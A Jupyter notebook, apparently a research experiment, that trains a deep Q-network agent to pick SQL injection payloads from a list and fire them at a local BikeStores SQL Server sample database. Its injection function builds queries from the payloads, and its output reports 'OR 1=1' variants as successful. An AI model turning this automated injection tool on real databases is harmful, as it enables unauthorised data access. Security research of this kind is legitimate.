{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "**DATABASE CONFIGURATION**"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "metadata": {},
   "outputs": [],
   "source": [
    "from sqlalchemy.engine import URL\n",
    "from sqlalchemy import create_engine\n",
    "import numpy as np\n",
    "import tensorflow as tf\n",
    "from tensorflow import keras\n",
    "from keras import layers\n",
    "import pandas as pd\n",
    "import numpy as np\n",
    "import json\n",
    "import sys"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Load Configuration File"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "{'database': {'name': 'BikeStores', 'server': '.\\\\SQLEXPRESS', 'driver': 'SQL Server', 'sample_query': 'SELECT * FROM production.brands'}, 'rl': {'state_info': {'mark_error': True, 'query_result_length': 100, 'padding_char': '\\x00'}, 'contexts': [{'query': 'SELECT * FROM production.products WHERE brand_id=8 [INPUT]', 'table_filter': ['production.products'], 'column_filter': ['product_name'], 'goal': 'Trek 820 - 2016'}]}}\n"
     ]
    }
   ],
   "source": [
    "with open('config.json', 'r') as config_file:\n",
    "    config = json.load(config_file)\n",
    "    print(config)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Set Up Connection to Microsoft SQL Database"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "   brand_id    brand_name\n",
      "0         1       Electra\n",
      "1         2          Haro\n",
      "2         3        Heller\n",
      "3         4   Pure Cycles\n",
      "4         5       Ritchey\n",
      "5         6       Strider\n",
      "6         7  Sun Bicycles\n",
      "7         8         Surly\n",
      "8         9          Trek\n"
     ]
    }
   ],
   "source": [
    "db = config['database']\n",
    "\n",
    "name = db['name']\n",
    "server = db['server']\n",
    "driver = db['driver']\n",
    "\n",
    "# Connect to SQL database using the above parameters.\n",
    "conn_string = f'DRIVER={driver};SERVER={server};DATABASE={name};Trusted_Connection=yes'\n",
    "conn_url = URL.create('mssql+pyodbc', query={'odbc_connect': conn_string})\n",
    "engine = create_engine(conn_url)\n",
    "\n",
    "# Display a dataframe from a sample query if set.\n",
    "if 'sample_query' in db:\n",
    "    sample_query = db['sample_query']\n",
    "    df = pd.read_sql(sample_query, engine)\n",
    "    print(df)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "**REINFORCEMENT LEARNING**"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Define State Configuration"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "metadata": {},
   "outputs": [],
   "source": [
    "state_info_config = config['rl']['state_info']\n",
    "mark_error = state_info_config['mark_error']\n",
    "query_result_length = state_info_config['query_result_length']\n",
    "padding_char = state_info_config['padding_char']\n",
    "error_char = 'y'\n",
    "no_error_char = 'n'"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Define RL Contexts and Incrementation"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Not having any defined RL contexts will result in an error.\n",
    "contexts = config['rl']['contexts']\n",
    "context = contexts[0]\n",
    "context_index = 0\n",
    "\n",
    "# Increments RL context and returns whether another context was assigned.\n",
    "def incr_context():\n",
    "    global context, context_index\n",
    "    if context_index < len(contexts) - 1:\n",
    "        context_index += 1\n",
    "        context = contexts[context_index]\n",
    "        return True\n",
    "    return False"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Create SQL Injection Attack Functionality"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 17,
   "metadata": {},
   "outputs": [],
   "source": [
    "# TODO: Remove non-MSSQL payloads.\n",
    "payloads = open('sqli_payloads.txt', 'r').read().split('\\n')\n",
    "reward_success = 1\n",
    "reward_norm = 0\n",
    "\n",
    "# Perfoms an SQL injection attack based on an index from the list of payloads.\n",
    "def inject_payload(payload_index):\n",
    "    # Finds [INPUT] within the context query configuration and replaces it with the payload.\n",
    "    payload = payloads[payload_index]\n",
    "    query = context['query']\n",
    "    query = query.replace('[INPUT]', payload)\n",
    "\n",
    "    reward = reward_norm\n",
    "    episode_over = False\n",
    "\n",
    "    try:\n",
    "        # Runs SQL injection query.\n",
    "        df = pd.read_sql(query, engine)\n",
    "        res = df.to_csv()\n",
    "\n",
    "        # Check episode termination condition, and if true, apply appropriate reward.\n",
    "        # TODO: Ensure tables are filtered as the same column name could exist in another table.\n",
    "        for column in context['column_filter']:\n",
    "            if column in df and context['goal'] in df[column].values:\n",
    "                reward = reward_success\n",
    "                episode_over = True\n",
    "\n",
    "        has_error = no_error_char\n",
    "    except:\n",
    "        # Record error as a String.\n",
    "        res = str(sys.exc_info()[1])\n",
    "        has_error = error_char\n",
    "\n",
    "    # Trim resulting string or pad it so that the length is equal to query_result_length.\n",
    "    if len(res) > query_result_length:\n",
    "        res = res[:query_result_length]\n",
    "    else:\n",
    "        res = res.ljust(query_result_length, padding_char)\n",
    "\n",
    "    # Add error information if this is set.\n",
    "    if mark_error:\n",
    "        res = res + has_error\n",
    "\n",
    "    return [ord(s) for s in res], reward, episode_over"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "DQN (Adapted from https://keras.io/examples/rl/deep_q_network_breakout/)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 18,
   "metadata": {},
   "outputs": [],
   "source": [
    "gamma = 0.99  # Discount factor for past rewards\n",
    "epsilon = 1.0  # Epsilon greedy parameter\n",
    "epsilon_min = 0.1  # Minimum epsilon greedy parameter\n",
    "epsilon_max = 1.0  # Maximum epsilon greedy parameter\n",
    "epsilon_interval = (\n",
    "    epsilon_max - epsilon_min\n",
    ")  # Rate at which to reduce chance of random action being taken\n",
    "batch_size = 32  # Size of batch taken from replay buffer\n",
    "max_steps_per_episode = 1000\n",
    "max_running_reward = reward_success*0.2\n",
    "\n",
    "num_actions = len(payloads)\n",
    "\n",
    "# If a query result is an error, and if mark_error is true, this distinction will be added to the state information.\n",
    "# TODO: Ensure mark_error information has a higher weighting in the neural net.\n",
    "nn_input_size = query_result_length\n",
    "if(mark_error):\n",
    "    nn_input_size += 1"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 19,
   "metadata": {},
   "outputs": [],
   "source": [
    "def create_q_model(batch_size):\n",
    "    # Network defined by the Deepmind paper\n",
    "    inputs = layers.Input(shape=(1, nn_input_size), batch_size=batch_size)\n",
    "\n",
    "    # Convolutions on the frames on the screen\n",
    "    layer1 = layers.Conv1D(32, 1, strides=4, activation=\"relu\")(inputs)\n",
    "    layer2 = layers.Conv1D(64, 1, strides=2, activation=\"relu\")(layer1)\n",
    "    layer3 = layers.Conv1D(64, 1, strides=1, activation=\"relu\")(layer2)\n",
    "\n",
    "    layer4 = layers.Flatten()(layer3)\n",
    "\n",
    "    layer5 = layers.Dense(512, activation=\"relu\")(layer4)\n",
    "    action = layers.Dense(num_actions, activation=\"linear\")(layer5)\n",
    "\n",
    "    return keras.Model(inputs=inputs, outputs=action)\n",
    "\n",
    "# The first model makes the predictions for Q-values which are used to\n",
    "# make an action.\n",
    "model = create_q_model(1)\n",
    "# Build a target model for the prediction of future rewards.\n",
    "# The weights of a target model get updated every 10000 steps thus when the\n",
    "# loss between the Q-values is calculated the target Q-value is stable.\n",
    "model_target = create_q_model(batch_size)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 20,
   "metadata": {},
   "outputs": [],
   "source": [
    "def create_init_state():\n",
    "    state = padding_char * query_result_length\n",
    "    if mark_error:\n",
    "        state = state + no_error_char\n",
    "    state = [ord(s) for s in state]\n",
    "    return state"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 21,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 0.00\t Episode 0\t Frame count: 100\t Terminating payloads: 0\n",
      "Running reward: 0.00\t Episode 0\t Frame count: 200\t Terminating payloads: 0\n",
      "Running reward: 0.00\t Episode 0\t Frame count: 300\t Terminating payloads: 0\n",
      "Running reward: 0.00\t Episode 0\t Frame count: 400\t Terminating payloads: 0\n",
      "Running reward: 0.00\t Episode 0\t Frame count: 500\t Terminating payloads: 0\n",
      "Running reward: 0.00\t Episode 0\t Frame count: 600\t Terminating payloads: 0\n",
      "Running reward: 0.00\t Episode 0\t Frame count: 700\t Terminating payloads: 0\n",
      "Running reward: 0.00\t Episode 0\t Frame count: 800\t Terminating payloads: 0\n",
      "Running reward: 0.00\t Episode 0\t Frame count: 900\t Terminating payloads: 0\n",
      "Running reward: 0.00\t Episode 1\t Frame count: 1000\t Terminating payloads: 0\n",
      "Running reward: 0.00\t Episode 1\t Frame count: 1100\t Terminating payloads: 0\n",
      "Running reward: 0.00\t Episode 1\t Frame count: 1200\t Terminating payloads: 0\n",
      "Running reward: 0.00\t Episode 1\t Frame count: 1300\t Terminating payloads: 0\n",
      "Running reward: 0.00\t Episode 1\t Frame count: 1400\t Terminating payloads: 0\n",
      "Running reward: 0.00\t Episode 1\t Frame count: 1500\t Terminating payloads: 0\n",
      "Running reward: 0.00\t Episode 1\t Frame count: 1600\t Terminating payloads: 0\n",
      "Running reward: 0.00\t Episode 1\t Frame count: 1700\t Terminating payloads: 0\n",
      "Running reward: 0.00\t Episode 1\t Frame count: 1800\t Terminating payloads: 0\n",
      "Running reward: 0.00\t Episode 1\t Frame count: 1900\t Terminating payloads: 0\n",
      "Running reward: 0.00\t Episode 2\t Frame count: 2000\t Terminating payloads: 0\n",
      "Running reward: 0.00\t Episode 2\t Frame count: 2100\t Terminating payloads: 0\n",
      "Running reward: 0.00\t Episode 2\t Frame count: 2200\t Terminating payloads: 0\n",
      "Running reward: 0.00\t Episode 2\t Frame count: 2300\t Terminating payloads: 0\n",
      "Running reward: 0.00\t Episode 2\t Frame count: 2400\t Terminating payloads: 0\n",
      "Running reward: 0.00\t Episode 2\t Frame count: 2500\t Terminating payloads: 0\n",
      "Running reward: 0.00\t Episode 2\t Frame count: 2600\t Terminating payloads: 0\n",
      "Running reward: 0.00\t Episode 2\t Frame count: 2700\t Terminating payloads: 0\n",
      "Running reward: 0.00\t Episode 2\t Frame count: 2800\t Terminating payloads: 0\n",
      "Running reward: 0.00\t Episode 2\t Frame count: 2900\t Terminating payloads: 0\n",
      "Running reward: 0.00\t Episode 3\t Frame count: 3000\t Terminating payloads: 0\n",
      "Running reward: 0.00\t Episode 3\t Frame count: 3100\t Terminating payloads: 0\n",
      "Running reward: 0.00\t Episode 3\t Frame count: 3200\t Terminating payloads: 0\n",
      "Running reward: 0.00\t Episode 3\t Frame count: 3300\t Terminating payloads: 0\n",
      "Running reward: 0.00\t Episode 3\t Frame count: 3400\t Terminating payloads: 0\n",
      "Running reward: 0.00\t Episode 3\t Frame count: 3500\t Terminating payloads: 0\n",
      "Running reward: 0.00\t Episode 3\t Frame count: 3600\t Terminating payloads: 0\n",
      "Running reward: 0.00\t Episode 3\t Frame count: 3700\t Terminating payloads: 0\n",
      "Running reward: 0.00\t Episode 3\t Frame count: 3800\t Terminating payloads: 0\n",
      "Running reward: 0.00\t Episode 3\t Frame count: 3900\t Terminating payloads: 0\n",
      "Running reward: 0.00\t Episode 4\t Frame count: 4000\t Terminating payloads: 0\n",
      "Running reward: 0.00\t Episode 4\t Frame count: 4100\t Terminating payloads: 0\n",
      "Running reward: 0.00\t Episode 4\t Frame count: 4200\t Terminating payloads: 0\n",
      "Running reward: 0.00\t Episode 4\t Frame count: 4300\t Terminating payloads: 0\n",
      "Running reward: 0.00\t Episode 4\t Frame count: 4400\t Terminating payloads: 0\n",
      "Running reward: 0.00\t Episode 4\t Frame count: 4500\t Terminating payloads: 0\n",
      "Running reward: 0.00\t Episode 4\t Frame count: 4600\t Terminating payloads: 0\n",
      "Running reward: 0.20\t Episode 5\t Frame count: 4700\t Terminating payloads: 1\n",
      "Running reward: 0.20\t Episode 5\t Frame count: 4800\t Terminating payloads: 1\n",
      "Running reward: 0.20\t Episode 5\t Frame count: 4900\t Terminating payloads: 1\n",
      "Running reward: 0.20\t Episode 5\t Frame count: 5000\t Terminating payloads: 1\n",
      "Running reward: 0.20\t Episode 5\t Frame count: 5100\t Terminating payloads: 1\n",
      "Running reward: 0.20\t Episode 5\t Frame count: 5200\t Terminating payloads: 1\n",
      "Running reward: 0.20\t Episode 5\t Frame count: 5300\t Terminating payloads: 1\n",
      "Running reward: 0.20\t Episode 5\t Frame count: 5400\t Terminating payloads: 1\n",
      "Running reward: 0.20\t Episode 5\t Frame count: 5500\t Terminating payloads: 1\n",
      "Running reward: 0.20\t Episode 5\t Frame count: 5600\t Terminating payloads: 1\n",
      "Running reward: 0.17\t Episode 6\t Frame count: 5700\t Terminating payloads: 1\n",
      "Running reward: 0.17\t Episode 6\t Frame count: 5800\t Terminating payloads: 1\n",
      "Running reward: 0.17\t Episode 6\t Frame count: 5900\t Terminating payloads: 1\n",
      "Running reward: 0.17\t Episode 6\t Frame count: 6000\t Terminating payloads: 1\n",
      "Running reward: 0.17\t Episode 6\t Frame count: 6100\t Terminating payloads: 1\n",
      "Running reward: 0.17\t Episode 6\t Frame count: 6200\t Terminating payloads: 1\n",
      "Running reward: 0.17\t Episode 6\t Frame count: 6300\t Terminating payloads: 1\n",
      "Running reward: 0.17\t Episode 6\t Frame count: 6400\t Terminating payloads: 1\n",
      "Running reward: 0.17\t Episode 6\t Frame count: 6500\t Terminating payloads: 1\n",
      "Running reward: 0.17\t Episode 6\t Frame count: 6600\t Terminating payloads: 1\n",
      "Running reward: 0.14\t Episode 7\t Frame count: 6700\t Terminating payloads: 1\n",
      "Running reward: 0.14\t Episode 7\t Frame count: 6800\t Terminating payloads: 1\n",
      "Running reward: 0.14\t Episode 7\t Frame count: 6900\t Terminating payloads: 1\n",
      "Running reward: 0.14\t Episode 7\t Frame count: 7000\t Terminating payloads: 1\n",
      "Running reward: 0.14\t Episode 7\t Frame count: 7100\t Terminating payloads: 1\n",
      "Running reward: 0.14\t Episode 7\t Frame count: 7200\t Terminating payloads: 1\n",
      "Running reward: 0.14\t Episode 7\t Frame count: 7300\t Terminating payloads: 1\n",
      "Running reward: 0.14\t Episode 7\t Frame count: 7400\t Terminating payloads: 1\n",
      "Running reward: 0.14\t Episode 7\t Frame count: 7500\t Terminating payloads: 1\n",
      "Running reward: 0.14\t Episode 7\t Frame count: 7600\t Terminating payloads: 1\n",
      "Running reward: 0.12\t Episode 8\t Frame count: 7700\t Terminating payloads: 1\n",
      "Running reward: 0.12\t Episode 8\t Frame count: 7800\t Terminating payloads: 1\n",
      "Running reward: 0.12\t Episode 8\t Frame count: 7900\t Terminating payloads: 1\n",
      "Running reward: 0.12\t Episode 8\t Frame count: 8000\t Terminating payloads: 1\n",
      "Running reward: 0.12\t Episode 8\t Frame count: 8100\t Terminating payloads: 1\n",
      "Running reward: 0.12\t Episode 8\t Frame count: 8200\t Terminating payloads: 1\n",
      "Running reward: 0.12\t Episode 8\t Frame count: 8300\t Terminating payloads: 1\n",
      "Running reward: 0.12\t Episode 8\t Frame count: 8400\t Terminating payloads: 1\n",
      "Running reward: 0.12\t Episode 8\t Frame count: 8500\t Terminating payloads: 1\n",
      "Running reward: 0.12\t Episode 8\t Frame count: 8600\t Terminating payloads: 1\n",
      "Running reward: 0.11\t Episode 9\t Frame count: 8700\t Terminating payloads: 1\n",
      "Running reward: 0.11\t Episode 9\t Frame count: 8800\t Terminating payloads: 1\n",
      "Running reward: 0.11\t Episode 9\t Frame count: 8900\t Terminating payloads: 1\n",
      "Running reward: 0.11\t Episode 9\t Frame count: 9000\t Terminating payloads: 1\n",
      "Running reward: 0.11\t Episode 9\t Frame count: 9100\t Terminating payloads: 1\n",
      "Running reward: 0.11\t Episode 9\t Frame count: 9200\t Terminating payloads: 1\n",
      "Running reward: 0.11\t Episode 9\t Frame count: 9300\t Terminating payloads: 1\n",
      "Running reward: 0.11\t Episode 9\t Frame count: 9400\t Terminating payloads: 1\n",
      "Running reward: 0.11\t Episode 9\t Frame count: 9500\t Terminating payloads: 1\n",
      "Running reward: 0.11\t Episode 9\t Frame count: 9600\t Terminating payloads: 1\n",
      "Running reward: 0.10\t Episode 10\t Frame count: 9700\t Terminating payloads: 1\n",
      "Running reward: 0.10\t Episode 10\t Frame count: 9800\t Terminating payloads: 1\n",
      "Running reward: 0.10\t Episode 10\t Frame count: 9900\t Terminating payloads: 1\n",
      "Running reward: 0.10\t Episode 10\t Frame count: 10000\t Terminating payloads: 1\n",
      "Running reward: 0.10\t Episode 10\t Frame count: 10100\t Terminating payloads: 1\n",
      "Running reward: 0.10\t Episode 10\t Frame count: 10200\t Terminating payloads: 1\n",
      "Running reward: 0.10\t Episode 10\t Frame count: 10300\t Terminating payloads: 1\n",
      "Running reward: 0.10\t Episode 10\t Frame count: 10400\t Terminating payloads: 1\n",
      "Running reward: 0.10\t Episode 10\t Frame count: 10500\t Terminating payloads: 1\n",
      "Running reward: 0.10\t Episode 10\t Frame count: 10600\t Terminating payloads: 1\n",
      "Running reward: 0.09\t Episode 11\t Frame count: 10700\t Terminating payloads: 1\n",
      "Running reward: 0.09\t Episode 11\t Frame count: 10800\t Terminating payloads: 1\n",
      "Running reward: 0.09\t Episode 11\t Frame count: 10900\t Terminating payloads: 1\n",
      "Running reward: 0.09\t Episode 11\t Frame count: 11000\t Terminating payloads: 1\n",
      "Running reward: 0.09\t Episode 11\t Frame count: 11100\t Terminating payloads: 1\n",
      "Running reward: 0.17\t Episode 12\t Frame count: 11200\t Terminating payloads: 1\n",
      "Running reward: 0.17\t Episode 12\t Frame count: 11300\t Terminating payloads: 1\n",
      "Running reward: 0.17\t Episode 12\t Frame count: 11400\t Terminating payloads: 1\n",
      "Running reward: 0.17\t Episode 12\t Frame count: 11500\t Terminating payloads: 1\n",
      "Running reward: 0.17\t Episode 12\t Frame count: 11600\t Terminating payloads: 1\n",
      "Running reward: 0.17\t Episode 12\t Frame count: 11700\t Terminating payloads: 1\n",
      "Running reward: 0.17\t Episode 12\t Frame count: 11800\t Terminating payloads: 1\n",
      "Running reward: 0.17\t Episode 12\t Frame count: 11900\t Terminating payloads: 1\n",
      "Running reward: 0.17\t Episode 12\t Frame count: 12000\t Terminating payloads: 1\n",
      "Running reward: 0.17\t Episode 12\t Frame count: 12100\t Terminating payloads: 1\n",
      "Running reward: 0.15\t Episode 13\t Frame count: 12200\t Terminating payloads: 1\n",
      "Running reward: 0.15\t Episode 13\t Frame count: 12300\t Terminating payloads: 1\n",
      "Running reward: 0.15\t Episode 13\t Frame count: 12400\t Terminating payloads: 1\n",
      "Running reward: 0.15\t Episode 13\t Frame count: 12500\t Terminating payloads: 1\n",
      "Running reward: 0.15\t Episode 13\t Frame count: 12600\t Terminating payloads: 1\n",
      "Running reward: 0.15\t Episode 13\t Frame count: 12700\t Terminating payloads: 1\n",
      "Running reward: 0.15\t Episode 13\t Frame count: 12800\t Terminating payloads: 1\n",
      "Running reward: 0.15\t Episode 13\t Frame count: 12900\t Terminating payloads: 1\n",
      "Running reward: 0.15\t Episode 13\t Frame count: 13000\t Terminating payloads: 1\n",
      "Running reward: 0.15\t Episode 13\t Frame count: 13100\t Terminating payloads: 1\n",
      "Running reward: 0.14\t Episode 14\t Frame count: 13200\t Terminating payloads: 1\n",
      "Running reward: 0.14\t Episode 14\t Frame count: 13300\t Terminating payloads: 1\n",
      "Running reward: 0.20\t Episode 15\t Frame count: 13400\t Terminating payloads: 2\n",
      "Running reward: 0.20\t Episode 15\t Frame count: 13500\t Terminating payloads: 2\n",
      "Running reward: 0.20\t Episode 15\t Frame count: 13600\t Terminating payloads: 2\n",
      "Running reward: 0.20\t Episode 15\t Frame count: 13700\t Terminating payloads: 2\n",
      "Running reward: 0.20\t Episode 15\t Frame count: 13800\t Terminating payloads: 2\n",
      "Running reward: 0.20\t Episode 15\t Frame count: 13900\t Terminating payloads: 2\n",
      "Running reward: 0.20\t Episode 15\t Frame count: 14000\t Terminating payloads: 2\n",
      "Solved at episode 16!\n"
     ]
    }
   ],
   "source": [
    "# In the Deepmind paper they use RMSProp however then Adam optimizer\n",
    "# improves training time\n",
    "optimizer = keras.optimizers.Adam(learning_rate=0.00025, clipnorm=1.0)\n",
    "\n",
    "# Experience replay buffers\n",
    "action_history = []\n",
    "state_history = []\n",
    "state_next_history = []\n",
    "rewards_history = []\n",
    "done_history = []\n",
    "episode_reward_history = []\n",
    "running_reward = 0\n",
    "episode_count = 0\n",
    "frame_count = 0\n",
    "# Number of frames to take random action and observe output\n",
    "epsilon_random_frames = 50\n",
    "# Number of frames for exploration\n",
    "epsilon_greedy_frames = 100.0\n",
    "# Maximum replay length\n",
    "# Note: The Deepmind paper suggests 1000000 however this causes memory issues\n",
    "max_memory_length = 30\n",
    "# Train the model after 4 actions\n",
    "update_after_actions = 4\n",
    "# How often to update the target network\n",
    "update_target_network = 100\n",
    "# Using huber loss for stability\n",
    "loss_function = keras.losses.Huber()\n",
    "\n",
    "terminating_actions = set()\n",
    "\n",
    "while True:  # Run until solved\n",
    "    state = create_init_state()\n",
    "    episode_reward = 0\n",
    "\n",
    "    for timestep in range(1, max_steps_per_episode):\n",
    "        # env.render(); Adding this line would show the attempts\n",
    "        # of the agent in a pop up window.\n",
    "        frame_count += 1\n",
    "\n",
    "        # Use epsilon-greedy for exploration\n",
    "        if frame_count < epsilon_random_frames or epsilon > np.random.rand(1)[0]:\n",
    "            # Take random action\n",
    "            action = np.random.choice(num_actions)\n",
    "        else:\n",
    "            # Predict action Q-values\n",
    "            # From environment state\n",
    "            state = np.array(state).reshape(1, 1, nn_input_size)\n",
    "            action_probs = model(state, training=False)\n",
    "            # Take best action\n",
    "            action = tf.argmax(action_probs[0]).numpy()\n",
    "\n",
    "        # Decay probability of taking random action\n",
    "        epsilon -= epsilon_interval / epsilon_greedy_frames\n",
    "        epsilon = max(epsilon, epsilon_min)\n",
    "\n",
    "        # Apply the sampled action in our environment\n",
    "        state_next, reward, done = inject_payload(action)\n",
    "        state_next = np.array(state_next)\n",
    "\n",
    "        episode_reward += reward\n",
    "\n",
    "        # Save actions and states in replay buffer\n",
    "        action_history.append(action)\n",
    "        state_history.append(state)\n",
    "        state_next_history.append(state_next)\n",
    "        done_history.append(done)\n",
    "        rewards_history.append(reward)\n",
    "        state = state_next\n",
    "\n",
    "        # Update every fourth frame and once batch size is over 32\n",
    "        if frame_count % update_after_actions == 0 and len(done_history) > batch_size:\n",
    "\n",
    "            # Get indices of samples for replay buffers\n",
    "            indices = np.random.choice(range(len(done_history)), size=batch_size)\n",
    "\n",
    "            # Using list comprehension to sample from replay buffer\n",
    "            state_sample = np.array([state_history[i] for i in indices])\n",
    "            state_next_sample = np.array([state_next_history[i] for i in indices]).reshape(batch_size, 1, 1, nn_input_size)\n",
    "            rewards_sample = [rewards_history[i] for i in indices]\n",
    "            action_sample = [action_history[i] for i in indices]\n",
    "            done_sample = tf.convert_to_tensor(\n",
    "                [float(done_history[i]) for i in indices]\n",
    "            )\n",
    "\n",
    "            # Build the updated Q-values for the sampled future states\n",
    "            # Use the target model for stability\n",
    "            future_rewards = model_target.predict(state_next_sample)\n",
    "            # Q value = reward + discount factor * expected future reward\n",
    "            updated_q_values = rewards_sample + gamma * tf.reduce_max(\n",
    "                future_rewards, axis=1\n",
    "            )\n",
    "\n",
    "            # If final frame set the last value to -1\n",
    "            updated_q_values = updated_q_values * (1 - done_sample) - done_sample\n",
    "\n",
    "            # Create a mask so we only calculate loss on the updated Q-values\n",
    "            masks = tf.one_hot(action_sample, num_actions)\n",
    "\n",
    "            with tf.GradientTape() as tape:\n",
    "                # Train the model on the states and updated Q-values\n",
    "                q_values = model(state_sample)\n",
    "\n",
    "                # Apply the masks to the Q-values to get the Q-value for action taken\n",
    "                q_action = tf.reduce_sum(tf.multiply(q_values, masks), axis=1)\n",
    "                # Calculate loss between new Q-value and old Q-value\n",
    "                loss = loss_function(updated_q_values, q_action)\n",
    "\n",
    "            # Backpropagation\n",
    "            grads = tape.gradient(loss, model.trainable_variables)\n",
    "            optimizer.apply_gradients(zip(grads, model.trainable_variables))\n",
    "\n",
    "        if frame_count % update_target_network == 0:\n",
    "            # update the the target network with new weights\n",
    "            model_target.set_weights(model.get_weights())\n",
    "            # Log details\n",
    "            template = 'Running reward: {:.2f}\\t Episode {}\\t Frame count: {}\\t Terminating payloads: {}'\n",
    "            print(template.format(running_reward, episode_count, frame_count, len(terminating_actions)))\n",
    "\n",
    "        # Limit the state and reward history\n",
    "        if len(rewards_history) > max_memory_length:\n",
    "            del rewards_history[:1]\n",
    "            del state_history[:1]\n",
    "            del state_next_history[:1]\n",
    "            del action_history[:1]\n",
    "            del done_history[:1]\n",
    "\n",
    "        if done:\n",
    "            terminating_actions.add(action_history[len(action_history)-1])\n",
    "            break\n",
    "\n",
    "    # Update running reward to check condition for solving\n",
    "    episode_reward_history.append(episode_reward)\n",
    "    if len(episode_reward_history) > 100:\n",
    "        del episode_reward_history[:1]\n",
    "    running_reward = np.mean(episode_reward_history)\n",
    "\n",
    "    episode_count += 1\n",
    "\n",
    "    if running_reward > max_running_reward:  # Condition to consider the task solved\n",
    "        print(f'Solved at episode {episode_count}!')\n",
    "        break"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 22,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Successful SQL injection payloads: ['OR 1=1-- ', 'OR 1=1']\n"
     ]
    }
   ],
   "source": [
    "print('Successful SQL injection payloads:', [payloads[a] for a in terminating_actions])"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3.10.4 64-bit",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.10.4"
  },
  "orig_nbformat": 4,
  "vscode": {
   "interpreter": {
    "hash": "844694dc4390c811ac8b4d2fcaa7d18288efc8c697b009159baa2dd36f994a81"
   }
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
